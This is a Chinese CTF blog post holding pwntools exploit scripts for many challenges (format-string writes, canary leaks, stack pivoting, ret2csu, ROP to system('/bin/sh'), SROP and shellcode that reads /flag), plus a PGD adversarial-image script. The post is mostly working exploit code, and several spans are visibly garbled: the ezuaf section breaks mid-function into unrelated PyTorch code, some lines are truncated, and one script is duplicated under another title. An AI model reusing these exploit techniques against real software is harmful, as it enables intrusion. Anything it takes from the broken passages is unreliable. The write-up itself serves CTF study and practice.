---
title: "CTF 比赛和复现"
date: 2025-08-01
categories:
  - CTF
  - 比赛复现
tags:
  - CTF
  - pwn
  - fmt
  - canary
---

# FZN CTF
## fmt
第一道题首先是一个格式化字符串


```python
from pwn import *
#p = process("./fmt")
p = remote("",)
context.log_level = 'debug'
#gdb.attach(p)
p.recvuntil("please input:")
p1 = b'%7$s'

p.sendline(p1)

p.interactive()
```


第二个题是canary


```python
from pwn import *

p = remote("", )
context.log_level = 'debug'

p.recvuntil("Can you guess the number?")

offset = 0x70 - 0xc
first_payload = b'a' * offset
p.sendline(first_payload)

p.recvuntil(b'a' * offset)

canary_bytes = p.recv(4)
canary_value = u32(canary_bytes) - 0xa

shell_address = 0x8049285

final_payload = b'a' * offset 
final_payload += p32(canary_value)
final_payload += b'a' * 0xc
final_payload += p32(shell_address)

p.sendline(final_payload)

p.interactive()
```


stack

栈迁移，需要泄露rbp的地址


```python
from pwn import *

choice = input("yes is process, no is remote: ")

if "y" in choice:
    p = process("./stack_pivotingx64")
elif "n" in choice:
    p = remote("", )

context.log_level = 'debug'

p.recvuntil("please give me your name\n")

first_payload = b'a' * 0x30
p.send(first_payload)

p.recvuntil(b'a' * 0x30)

leaked_data = p.recv(6)
rbp_value = u64(leaked_data[-6:].ljust(8, b'\x00')) - 0x10

rsp_value = rbp_value - 0x30
binsh_address = rsp_value + 32

print(hex(rbp_value))

pop_rdi_gadget = 0x0000000000401275
system_function = 0x40126a
magic_function = 0x401256
final_payload = p64(0)
final_payload += p64(pop_rdi_gadget)
final_payload += p64(binsh_address)
final_payload += p64(system_function)
final_payload += b'/bin/sh\x00'
final_payload += p64(magic_function + 1)
final_payload += p64(rsp_value)
final_payload += p64(magic_function)

p.recvuntil("give me some other message\n")
p.send(final_payload)
p.interactive()
```


## ezuaf
这个题稍微难一点

del函数

```c
int del()
{
  int v0; // eax
  void *v1; // rdi

  puts("idx?");
  v0 = get_int();
  if ( v0  Tensor [0.0, 1.0])
    transform_to_tensor = transforms.Compose([
        transforms.ToTensor()
    ])
    
    # 2. 输出转换 (Tensor [0.0, 1.0] -> PIL [0, 255])
    transform_to_pil = transforms.ToPILImage()
    
    print(f"[信息] 模型和转换器准备就绪, 使用设备: {device}")
    return model, transform_to_tensor, transform_to_pil, device

# ================================================
# 阶段二：准备攻击所需数据
# ================================================

def load_ground_truth_labels():
    """
    从 data/paths_and_labels.txt 加载所有图片的真实标签。
    此版本已修复，可以正确处理 string 类型的标签名。
    """
    label_file = "data/paths_and_labels.txt" #
    class_indices_file = "data/class_indices.json" #
    
    # 确保两个文件都存在
    assert Path(label_file).exists(), f"文件未找到: {label_file}"
    assert Path(class_indices_file).exists(), f"文件未找到: {class_indices_file}"
    
    # 1. 加载类别名称到索引的映射
    #    class_indices.json 的格式是 {"0": "class_name_A", "1": "class_name_B"}
    #    我们需要反转它，变成 {"class_name_A": 0, "class_name_B": 1}
    class_idx_map = json.loads(Path(class_indices_file).read_text(encoding='utf-8'))
    name_to_idx_map = {name: int(idx) for idx, name in class_idx_map.items()}

    labels = {}
    # 使用 'encoding='utf-8'' 打开文件，防止特殊字符（如日志中的空格）出错
    with open(label_file, 'r', encoding='utf-8') as f:
        for line in f.readlines():
            line = line.strip()
            if line:
                try:
                    # 2. 修复 line.split()
                    #    使用 split(None, 1) 来分割，确保只在第一个空格块处分割
                    #    这可以处理 'data/images/843.png   No_Entry_for_Motor_Vehicles'
                    path, label_name = line.split(None, 1)
                    
                    # 3. 修复 img_id 的解析
                    #    os.path.basename(path) -> "843.png"
                    #    .split('.')[0] -> "843"
                    #    int(...) -> 843
                    img_id = int(os.path.basename(path).split('.')[0])
                    
                    # 4. 修复标签的解析
                    #    使用我们创建的映射将 "No_Entry_for_Motor_Vehicles" 转换为 对应的整数
                    #    使用 .strip() 来移除 label_name 周围可能存在的额外空格
                    label_index = name_to_idx_map[label_name.strip()]
                    
                    labels[img_id] = label_index
                    
                except Exception as e:
                    print(f"解析标签文件出错: {e}, 行: '{line}'")
    
    print(f"[信息] 从 'paths_and_labels.txt' 加载了 {len(labels)} 个真实标签。")
    return labels

# ================================================
# 阶段三：定义并执行攻击
# ================================================

def run_pgd_attack(model, loss_fn, img_tensor, label_tensor, device, epsilon, alpha, num_steps):
    """
    对单张图片执行 PGD 攻击。
    """
    # 克隆原始图像作为攻击的起点
    adv_img = img_tensor.clone().detach().to(device)
    
    # 原始图像张量（用于计算扰动边界）
    original_img = img_tensor.clone().detach().to(device)

    for _ in range(num_steps):
        # 1. 启用梯度
        adv_img.requires_grad = True
        
        # 2. 模型正向传播
        outputs = model(adv_img)
        
        # 3. 计算损失（相对于 *真实* 标签）
        loss = loss_fn(outputs, label_tensor)
        
        # 4. 反向传播，计算梯度
        model.zero_grad()
        loss.backward()
        
        # 5. 获取梯度
        grad = adv_img.grad.data
        
        # 6. PGD 核心：梯度上升（加号），并 .sign()
        adv_img = adv_img.detach() + alpha * grad.sign()
        
        # 7. 约束扰动：确保扰动本身不超过 epsilon (L-infinity 范数)
        # delta 是总扰动
        delta = torch.clamp(adv_img - original_img, min=-epsilon, max=epsilon)
        
        # 8. 约束图像：将扰动后的图像裁剪回 [0.0, 1.0] 的有效范围
        adv_img = torch.clamp(original_img + delta, min=0.0, max=1.0)

    return adv_img.detach()


def main():
    # --- 1. 准备工作 ---
    model, to_tensor, to_pil, device = setup_model_and_transforms()
    ground_truth_labels = load_ground_truth_labels()
    
    # 定义损失函数
    loss_fn = nn.CrossEntropyLoss()

    # --- 2. 攻击参数 (*** 这是您需要调优的关键 ***) ---
    
    # epsilon: 最大扰动幅度。比赛要求扰动尽可能小 [cite: 7]。
    # 8/255 是一个常用值。您应该尝试更小的值，如 4/255, 2/255
    epsilon = 8.0 / 255.0  
    
    # alpha: 迭代步长
    alpha = 2.0 / 255.0
    
    # num_steps: 迭代次数
    num_steps = 10

    # --- 3. 循环攻击所有图片 ---
    
    input_dir = "data/images"
    output_dir = "advimages" #
    os.makedirs(output_dir, exist_ok=True) # 创建输出文件夹 [cite: 9]

    print(f"[信息] 开始攻击... Epsilon={epsilon:.4f}, Steps={num_steps}")

    # 使用 tqdm 创建一个进度条
    # 循环从 1.png 到 1000.png [cite: 11, 15]
    for i in tqdm(range(1, 1001), desc="正在生成对抗样本"):
        img_name = f"{i}.png" # [cite: 11]
        img_path = os.path.join(input_dir, img_name)
        
        # a. 加载原始图像和标签
        try:
            img_pil = Image.open(img_path).convert('RGB')
            true_label = ground_truth_labels[i]
            
            img_tensor = to_tensor(img_pil).unsqueeze(0).to(device)
            label_tensor = torch.tensor([true_label]).to(device)
        except Exception as e:
            print(f"无法加载图片 {img_name}: {e}")
            continue

        # b. 执行攻击
        adv_tensor = run_pgd_attack(model, loss_fn, img_tensor, label_tensor, 
                                    device, epsilon, alpha, num_steps)
        
        # c. 转换并保存图像
        # 移除批次维度 [1, 3, 224, 224] -> [3, 224, 224]
        adv_tensor_cpu = adv_tensor.squeeze(0).cpu() 
        # 转换为 PIL Image ( [0.0, 1.0] -> [0, 255] )
        adv_pil = to_pil(adv_tensor_cpu) 
        
        # d. 保存到 advimages 文件夹
        output_path = os.path.join(output_dir, img_name)
        adv_pil.save(output_path, format="PNG") # [cite: 9]

    print("="*50)
    print("攻击完成！")
    print(f"所有 1000 张对抗样本已保存到 '{output_dir}' 文件夹。")
    print("下一步：将 'advimages' 文件夹压缩为 'advimages_您的队伍名.zip' 并提交。") # [cite: 16]

if __name__ == '__main__':
    main()
```

我觉得分数应该不是很高。如果有分数限制的话应该过不了。本地调优的方法还没做。在提交之前可以先本地训练生成扰动。因为提交机会只有5次.。有平台以后看一下这个脚本的效果


这个题目我在网上找了半天没找见，之后看到了再找找。也没搜到官方的类似的答案


# 强网拟态
# pwn
## baby_stack
应该是签到题。改数字就行。当时就看了一下


```plain
from pwn import *

p = process('./babystack')
# p = remote('challenge.server.com', 12345)

target_value = 20150972

# p64(20150972) == b'\x0C\x7C\x33\x01\x00\x00\x00\x00'
value_bytes = p64(target_value)

padding = b'A' * 248

payload = padding + value_bytes

p.sendlineafter(b'Enter your flag1:', b'dummy_input')

print(f"Sending payload: {payload}")
p.sendlineafter(b'Enter your flag2:', payload)

p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1761840143698-afa90392-291d-4f56-ab08-457e2bb09420.png)

## stack(好像叫这个名)
第二个stack好像是要retdl。看提示像是。还没开始这个

看了之后发现情况是我们能打印出来libc的地址

之后要需要写openat的shellcode

```python
from pwn import *
import sys

if len(sys.argv) > 1:
    p = process('./pwn')
else:
    p = remote('', )

context(os='linux', arch='amd64', log_level='debug')

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF('./pwn')

p.send(b'name?')
p.send(b'a'*0x10)

p.recvuntil(b'\x7f')
stack_leak = u64(p.recv(6).ljust(8, b'\x00')) - 0x8
print(hex(stack_leak))

lea_printf = 0x40139B
main_addr = 0x401418

p.send(b'else?')
payload1 = b'a'*0x60 + p64(stack_leak) + p64(lea_printf) + p64(elf.plt['puts']) + p64(main_addr)
p.send(payload1)

p.recvuntil(b'\x7f')
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc_leak - 0x62050
print(hex(libc_base))

ret_gadget = libc_base + libc.search(asm("ret")).__next__()
pop_rdi = libc_base + libc.search(asm("pop rdi\nret")).__next__()
pop_rsi = libc_base + libc.search(asm("pop rsi\nret")).__next__()
pop_rax = libc_base + libc.search(asm("pop rax\nret")).__next__()
pop_rdx_r12 = libc_base + libc.search(asm("pop rdx\npop r12\nret")).__next__()

p.send(b'name?')
p.send(b'a'*0x10)

p.send(b'else?')
payload2 = b'a'*0x68 + p64(pop_rdx_r12) + p64(7) + p64(0) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdi) + p64(stack_leak & -0x1000) + p64(elf.plt['mprotect']) + p64(main_addr)
p.send(payload2)

p.send(b'name?')
p.send(b'a'*0x10)

shellcode = asm('''
mov rax, 0x67616c662f
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
xor edx, edx
xor r10, r10
push SYS_openat
pop rax
syscall

mov rdi, 1
mov rsi, 3
push 0
mov rdx, rsp
mov r10, 0x100
push SYS_sendfile
pop rax
syscall
''')

p.send(b'else?')
payload3 = shellcode.ljust(0x68, b'\x00') + p64(stack_leak - 0x18)
p.send(payload3)

p.interactive()
```


## aaaheap
这个还没有看。先把exp放到这。好像是改堆以后写shellcode


```python
from pwn import *
context.arch = 'aarch64'
context.log_level = 'debug'  # 第一次运行时开启，后面可以关掉
# p = process(['qemu-aarch64',"-g",'1234',  '-L', './lib/', './vuln'])
libc=ELF('./lib/lib/libc.so.6')
# p = process(['qemu-aarch64',  '-L', './lib/', './vuln'])
p = process('./aaaheap')
def cmd(idx):
    p.sendlineafter(b'Choice: ',str(idx))
def add(idx,size):
    cmd(1)
    p.sendlineafter(b'Index : ',str(idx))
    p.sendlineafter(b'Size: ',str(size))
def delete(idx):
    cmd(2)
    p.sendlineafter(b'Index: ',str(idx))
def edit(idx,msg):
    cmd(3)
    p.sendlineafter(b'Index: ', str(idx))
    p.sendafter(b"data:",msg)
def show(idx):
    cmd(4)
    p.sendlineafter(b'Index: ', str(idx))
add(0,0x80)
add(1,0x80)
add(8,0x80)
delete(0)
delete(1)
show(0)
p.recvuntil("Data: ")
heap=u64(p.recv(5).ljust(8,b'\x00'))>12)
edit(4,p64(magci)+p64(0))
add(0,0x38)
add(6,0x38)
edit(6,p64(0)*2+p64(heap+0x1d0+0x10))

p.interactive()
```


# newstar2025
当时做的和复现就放一起了。复现的后面就加括号

## week1
第一周的找不见了


## week2
刻在栈里的秘密


```plain
现在有一个密码隐藏在栈上(•̀ᴗ• )
你需要做的是通过格式化字符串来泄露这个密码o(´^｀)o！m, 告诉我密码我就给你flag
哦，对了对了，你还要告诉我指向这个密码的地址
在此之前, 你可以了解一下各个格式化字符串的用法, 例如 %p, %s, %d, 以及 $ 符号. emmm...还有 x86-64 函数调用约定!

指向密码的指针被存放在了 0x7fffb3af6fc0 中, 同时栈顶指针是 0x7fffb3af6f40 .
他们之间的距离是:也就是说, 在printf之前, 格式字符串的参数看起来就像 ( *・ω・)

0x7fffb3af6fc0: [?]  ')
    io.sendline(b'2')
    io.recvuntil(b'Which number?')
    io.recvuntil(b'> ')
    io.sendline(str(index))
    io.recvuntil(b'Change to what?')
    io.recvuntil(b'> ')
    io.sendline(str(number))

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)

main_addr=0x00000000004010B4

pop_rdi_ret_addr=0x0000000000401253
pop_rsi_r15_ret_addr=0x0000000000401251 
edit_addr=0x0000000000400A5A
ret_addr=0x00000000004006b6
###
add(1,0) #rbx=0
add(2,1) #rbp=1
add(3,write_got) #r12
add(4,1) #r13=edi
add(5,write_got) #r14
add(6,8) #r15
add(7,0x0000000000401230)#csu_font
add(8,1)
add(9,1)
add(10,1)
add(11,1)
add(12,1)
add(13,1)
add(14,1)
add(15,main_addr) #main
add(0,0x000000000040124A) #csu_end


leak =u64(io.recv(8))
print("leak:",hex(leak))

ONE=[0x4f2a5,0x4f302,0x10a2fc]
libc=ELF("./libc.so.6")
free_offset=libc.symbols["write"]
libc_base=leak-free_offset
system_offset=libc.symbols['system']
system_addr=libc_base+system_offset
binsh_addr=libc_base+next(libc.search(b"/bin/sh"))

add(1,binsh_addr)
add(2,ret_addr)
add(3,system_addr)
add(0,pop_rdi_ret_addr)
io.interactive()
```

## week3
### calc
```python
from pwn import *
import sys

filename = "./calc"
libc_name = "./libc.so.6"
arch = 'amd64'

context(log_level="debug", os="linux", arch=arch)

# 默认使用本地模式
io = process(filename)

elf = ELF(filename)
libc = ELF(libc_name)

def cmd(val):
    io.sendlineafter(b"> ", str(val).encode())

def edit(idx, val):
    cmd(2)
    cmd(idx)
    cmd(val)

def show_numbers():
    cmd(1)

def calc(type, num1, num2, result):
    cmd(type)
    cmd(num1)
    cmd(num2)
    cmd(result)

jmp_back_while = 0x1cda
pop_rdi_ret = 0x1d11
main_addr = 0x1be5

edit(15, jmp_back_while)
edit(1, elf.got['puts'])
print(f"puts_got-->{hex(elf.got['puts'])}")
edit(2, elf.plt['puts'])
edit(3, main_addr)
edit(4, pop_rdi_ret)

cmd(4)
calc(1, 0, 16, 16)
calc(2, 16, 15, 16)
calc(1, 1, 16, 1)
calc(1, 2, 16, 2)
calc(1, 3, 16, 3)
calc(1, 4, 16, 0)
cmd(6) 

leak_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
print(f"leaked libc addr!!-->{leak_addr:#x}")

libc_base = leak_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
ret_addr = libc_base + 0x29139
pop_rdi_ret = libc_base + 0x2a3e5

edit(1, binsh_addr)
edit(2, ret_addr)
edit(3, system_addr)
edit(0, pop_rdi_ret)

io.interactive()
```


### only_read
```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')

remote_addr = ""
remote_port = 
filename = "./pwn"

bss = 0x404100
gift_addr = 0x401366
syscall_ret_addr = 0x40136D
vuln_addr = 0x401342
pop_rbp_ret = 0x40118D

def exploit():
    io = remote(remote_addr, remote_port)

    payload1 = flat(
        b'a' * 0x10,
        bss + 0x200,
        vuln_addr
    )
    io.sendline(payload1)
    sleep(0.5)

    frame1 = SigreturnFrame()
    frame1.rax = 0
    frame1.rdi = 0
    frame1.rsi = bss + 0x200
    frame1.rdx = 0x500
    frame1.rip = syscall_ret_addr
    frame1.rsp = bss + 0x200

    payload2 = flat(
        b'a' * 0x18,
        gift_addr
    ) + bytes(frame1)[:-0x18]

    io.send(payload2)
    sleep(0.5)

    frame2 = SigreturnFrame()
    frame2.rax = 10
    frame2.rdi = 0x404000
    frame2.rsi = 0x1000
    frame2.rdx = 7
    frame2.rip = syscall_ret_addr
    frame2.rsp = bss + 0x200 + 256

    shellcode = asm('''
        mov rax, 0x67616c662f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        mov rdx, rax
        mov rsi, rsp
        mov rdi, 1
        mov rax, 1
        syscall
        
        mov rax, 60
        xor rdi, rdi
        syscall
    ''')

    log.info(f"Shellcode length: {len(shellcode)}")

    frame3 = SigreturnFrame()
    frame3.rip = bss + 0x200 + 512
    frame3.rsp = bss

    payload3 = p64(gift_addr) + bytes(frame2) + p64(gift_addr) + bytes(frame3) + shellcode

    io.send(payload3)
    io.interactive()

if __name__ == '__main__':
    exploit()

```


### sand_box_plus
```python
from pwn import *
import sys

filename = "./sandbox_plus"
libc_name = "./libc.so.6"
arch = 'amd64'
remote_addr = ""
remote_port = 

context(log_level="debug", os="linux", arch=arch)

# 默认使用远程模式
io = remote(remote_addr, remote_port)

# 如果需要本地测试，注释掉上面一行，
# 然后取消下面一行的注释
# io = process(filename)

# 如果需要gdb调试，
# io = process(filename)
# gdb.attach(io, gdbscript='''
# b *main+116
# c
# si 10
# ''')

elf = ELF(filename)
# libc = ELF(libc_name)

shellcode_addr = 0x114514

shellcode = """
 /* openat(0, "/flag", 0, 0) */
 mov rbx, 0x67616c662f
 push rbx
 push rsp
 pop rsi
 xor edi, edi
 xor r10, r10
 xor edx, edx
 push 0x101
 pop rax
 syscall
 mov rbx, rax

 /* pread64(fd, buf, 0x100, 0) */
 sub rsp, 0x100
 mov rdi, rbx
 mov rsi, 0x114514
 mov rdx, 0x100
 xor r10, r10
 mov eax, 17
 syscall
 add rsp, 0x100

 /* writev(1, &[0x114514, rax], 1) */
 push 1
 pop rdi
 push 0x1
 pop rdx
 push rax
 push rsi
 mov rsi, rsp
 push 0x14
 pop rax
 syscall
"""

assembled_shellcode = asm(shellcode)

print(f"shellcode length={len(assembled_shellcode)}")

io.sendafter(b"orw_plus function (also also after compile)\n",
             assembled_shellcode)

io.interactive()

```

和calc脚本一样，运行的时候要用到那个命令

## fmt_canary
```python
from pwn import *
import sys

filename = "./sandbox_plus"
libc_name = "./libc.so.6"
arch = 'amd64'
remote_addr = ""
remote_port = 

context(log_level="debug", os="linux", arch=arch)

# 默认使用远程模式
io = remote(remote_addr, remote_port)

# 如果需要本地测试，注释掉上面一行，
# 然后取消下面一行的注释
# io = process(filename)

# 如果需要gdb调试，
# io = process(filename)
# gdb.attach(io, gdbscript='''
# b *main+116
# c
# si 10
# ''')

elf = ELF(filename)
# libc = ELF(libc_name)

shellcode_addr = 0x114514

shellcode = """
 /* openat(0, "/flag", 0, 0) */
 mov rbx, 0x67616c662f
 push rbx
 push rsp
 pop rsi
 xor edi, edi
 xor r10, r10
 xor edx, edx
 push 0x101
 pop rax
 syscall
 mov rbx, rax

 /* pread64(fd, buf, 0x100, 0) */
 sub rsp, 0x100
 mov rdi, rbx
 mov rsi, 0x114514
 mov rdx, 0x100
 xor r10, r10
 mov eax, 17
 syscall
 add rsp, 0x100

 /* writev(1, &[0x114514, rax], 1) */
 push 1
 pop rdi
 push 0x1
 pop rdx
 push rax
 push rsi
 mov rsi, rsp
 push 0x14
 pop rax
 syscall
"""

assembled_shellcode = asm(shellcode)

print(f"shellcode length={len(assembled_shellcode)}")

io.sendafter(b"orw_plus function (also also after compile)\n",
             assembled_shellcode)

io.interactive()

```

## week4
### fmt


```python
from pwn import *
context(arch="amd64",os="linux",log_level='debug')
io = process("fmt_got")
io=remote('',)
elf=ELF("./fmt_got")
exit_got=elf.got['exit']
readflag_addr=0x0000000000401236

payload=b'%4628c'+b'%12$hn'+b'aa'+p64(exit_got)
io.recvuntil(b'>')
io.sendline(payload)
#io.recvall(timeout=5)
io.interactive()
```


### memory
```python
from pwn import *

context(arch="amd64", os="linux", log_level='debug')
io=process("memory")
io = remote('', ) 
elf = ELF("memory")
bss=elf.bss()+0x200

io.recvuntil("> ")
payload = asm(f'''
lea rsi, [rip + 0x100]  /* 先加一个大偏移 */
  sub rsi, 0x138         /* 再减去更多，达到-0x40的效果 */
  xor eax, eax
  mov al, 1
  xor edi, edi
  mov dil, 1
  mov edx, 100
  syscall
''')
#gdb.attach(io)
#pause()
io.sendline(payload)
io.interactive()
```


### desert
```python
from pwn import *
import ctypes
import tempfile
import os
context(arch="amd64",os="linux",log_level='debug')
io = process("desert")
io=remote('',)
elf=ELF("./desert")
read_addr=0x00000000004014A4
have_a_rest=0x0000000000401466
city_addr=elf.sym['city']
main_addr=elf.sym['main']

data = io.recvuntil(b'>> ')
print(data)
io.sendline(str(2))
data = io.recvuntil(b'>> ')
print(data)
padding=0x58
payload=b'a'*padding +p64(city_addr)+p64(have_a_rest)
io.sendline(payload)

###栈迁移
data = io.recvuntil(b'>> ')
print(data)
payload = b'b'*(padding-8)+p64(0x10000+0x50)+p64(read_addr)
#gdb.attach(io)
#pause()
io.sendline(payload)

shellcode=asm(shellcraft.amd64.sh())
print("length:",len(shellcode))
#gdb.attach(io)
#pause()
payload=shellcode.ljust(padding,b'\x00')+p64(0x10000)
io.sendline(payload)
io.interactive()
```

# Newstar 2024
# week1
## Login
main函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530950036-15809efe-8e92-496b-bedc-afb9d78375b3.png)

fun函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530949913-ba5e0ad9-6add-4831-8bac-aa3fab4b5220.png)

需要输入一个password。前十个数相同就执行win，win是后门函数。点击password，是NewStar!!!


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530950186-76ce8027-85f7-4998-9ec3-9b5e692c9191.png)

连上以后输入NewStar!!!就行


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530950187-c304f531-718c-4f20-a25c-e3f68045867e.png)

## game
game函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530949946-b115bf5e-f29f-47c9-9c69-d5a45cf50e93.png)

需要输入超过999的数会执行后门。每次只能输入一个大于0小于10的数，然后不要超过5秒。循环输入数字最后互动

```plain
from pwn import *
p=remote("192.168.202.1",35166)
p.recvuntil('pls input you num: ')

n = 100
for i in range(n):
    p.sendline(b'10')
    
p.interactive()
```

## gdb
需要的是s的值，buf和s一样就可以open flag


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951079-cec36cab-bd57-43f7-9f4d-42a390f819a2.png)

直接点s的话是没有东西。那需要gdb调试

调试出来的结果是s是


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951101-0dc3eaa6-96ae-426c-8f19-fd9b917cb166.png)

看到加密的是这个直接发送

```plain
from pwn import *
 
#p = process('./gdb')
p= remote('192.168.202.1',29547)
#context.log_level = 'debug'
#gdb.attach(p, 'b *$rebase(0x1872)')

p.sendline(b'\x5D\x1D\x43\x55\x53\x45\x57\x45')
p.interactive()
```

## overwrite
fun函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951725-1e90d0ba-0ae7-4f4d-bbac-7e14a4123782.png)

nbytes >48 就会exit ,nptr > 114514就会getflag

这两个之间的距离是0x30。这个题就是要跳过前面的长度检查。if的时候没有限制。有符号比较，然后read没有符号比较。可以通过输入负数。然后没有符号比较的时候它就是很大的一个数

```plain
from pwn import *

p = remote('192.168.202.1',53731)
payload = b'a'*0x30 + b'114515'
p.recv(b': ')
p.sendline(b'-1')
p.recv(b': ')
p.sendline(payload)

p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951610-abc3247c-be51-47c5-93d8-6cfe15c48675.png)

# week2
## Ezgame
libc题。有0x80.可以读0x100

libcsearch不知道为啥查不出来，直接用libc版本。（这个dump有问题？）

```plain
from pwn import*
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')  
e = ELF("./ezgame")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./ezgame")
#p=remote('27.25.151.26',46071)

ret_addr=0x400509
rdi_address = 0x400783
puts_plt = e.plt['puts']
puts_got = e.got['puts'] 
main_address =e.symbols['main']

payload = b'A'*(0x50+8)
payload += p64(rdi_address)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_address)

p.recvuntil(b"Welcome to NewStarCTF!!!!\n")

p.send(payload)
p.recvuntil(b'\x0a') 
puts_real_address = u64(p.recv(6).ljust(8,b'\x00'))
print("puts_real_address: ",hex(puts_real_address))

libc=LibcSearcher("puts",puts_real_address)
libc_base = puts_real_address -libc.dump['puts']
system_address = libc_base + libc.dump['system']
binsh_address = libc_base + libc.dump("str_bin_sh")

payload = b"A"*(0x50+8)
payload += p64(ret_addr)# stack alignment
payload += p64(rdi_address)
payload += p64(binsh_address)
payload += p64(system_address)

p.recvuntil(b'Welcome to NewStarCTF!!!!\n')
p.sendline(payload)

p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951686-ca30d2ac-1b55-497b-aeb7-5c1c1f1995d4.png)

libc版本的

```plain
from pwn import*

#context(arch='amd64', os='linux', log_level='debug')  
e = ELF("./ezgame")
libc = ELF("./libc-2.31.so")
#p=process("./ezgame")
p=remote('192.168.202.1',46085)

ret_addr=0x400509
rdi_address = 0x400783
puts_plt = e.plt['puts']
puts_got = e.got['puts'] 
main_address =e.symbols['main']

payload = b'A'*(0x50+8)
payload += p64(rdi_address)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_address)

p.recvuntil(b"Welcome to NewStarCTF!!!!\n")

p.send(payload)
p.recvuntil(b'\x0a') 
puts_real_address = u64(p.recv(6).ljust(8,b'\x00'))
print("puts_real_address: ",hex(puts_real_address))

libc_base = puts_real_address -libc.sym['puts']
system_address = libc_base + libc.sym['system']
binsh_address = libc_base + next(libc.search(b"/bin/sh"))

payload = b"A"*(0x50+8)
payload += p64(ret_addr)# stack alignment
payload += p64(rdi_address)
payload += p64(binsh_address)
payload += p64(system_address)

p.recvuntil(b'Welcome to NewStarCTF!!!!\n')
p.sendline(payload)

p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530952006-e6c7227a-72fa-4c88-ab68-b879b63d6760.png)

## My_GBC!!!!!
[是ret2csu。](https://hnusec-star.feishu.cn/wiki/AMDjwALobiy3c1kF0hacm9Oxn4e)

要先对加密函数进行解密。然后用csu是rop链不足。没有办法设置更多寄存器的值

gat1和gat2的片段

```plain
.text:0000000000401390
.text:0000000000401390 loc_401390:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000401390                 mov     rdx, r14
.text:0000000000401393                 mov     rsi, r13
.text:0000000000401396                 mov     edi, r12d
.text:0000000000401399                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
.text:000000000040139D                 add     rbx, 1
.text:00000000004013A1                 cmp     rbp, rbx
.text:00000000004013A4                 jnz     short loc_401390
.text:00000000004013A6
.text:00000000004013A6 loc_4013A6:                             ; CODE XREF: __libc_csu_init+35↑j
.text:00000000004013A6                 add     rsp, 8
.text:00000000004013AA                 pop     rbx
.text:00000000004013AB                 pop     rbp
.text:00000000004013AC                 pop     r12
.text:00000000004013AE                 pop     r13
.text:00000000004013B0                 pop     r14
.text:00000000004013B2                 pop     r15
.text:00000000004013B4                 retn
.text:00000000004013B4 ; } // starts at 401350
.text:00000000004013B4 __libc_csu_init endp
```

把后门写到bss段是可以的，或者直接用libc寻找也可以。这直接用libc找吧

### 0x38的偏移是怎么得到的
编译器通常会为对齐在 buf 后再插入 0x20 字节的填充（padding），满足 16 字节对齐。

因此，从缓冲区起始到返回地址的距离：

```plain
buf (0x10) + padding (0x20) + saved RBP (0x8) = 0x38
```

这样就得到了 0x38 的静态计算值。 

Key


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951944-5cbb77cf-953e-4929-bd2c-f6080288ab04.png)

```plain
from pwn import *

def ror(val, n):
    return ((val >> n) | (val > 8) & 0xffff

payload = b"%" + str(low_byte).encode() + b"c"
payload += b"%12$hhn"

padding = middle_bytes - low_byte
payload += b"%" + str(padding).encode() + b"c"
payload += b"%13$hn"

payload = payload.ljust(0x20, b'A')

payload += p64(elf.got['printf'])
payload += p64(elf.got['printf'] + 1)

p.sendafter(b": \n", payload)

p.sendlineafter(b": \n", b"sh;")

p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530952753-51e9eb13-4fd5-4985-b7eb-e8b3d273ae8a.png)

（这个题没搞清楚，照着答案wp写的）

## Inverted World
这个题，不用覆盖到canary拿到shell.它程序运行到bookdoor满足main里面的条件就能把flag打印出来。就是后门里面写的这个


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530952954-ba83bfd7-1227-428a-bda3-08875d5cae76.png)

不用绕过canay，栈溢出就行。然后它这个read函数定义的时候是反的读的,i--.输入的时候也要反着输入


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953060-cb858dea-7d8c-4537-8e1f-a9a73c79be85.png)

read读取的很大就溢出就行。不写到canary就不用绕过canary


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953442-561c28e8-a156-47e4-83b1-38b366eb6118.png)

```plain
from pwn import*

context.log_level='debug'

p=remote('', ?????)

payload=b'a'*0x100
p.sendline(payload+p64(0x040137C)[::-1])
p.sendlineafter("root@AkyOI-VM:~#", "hs")
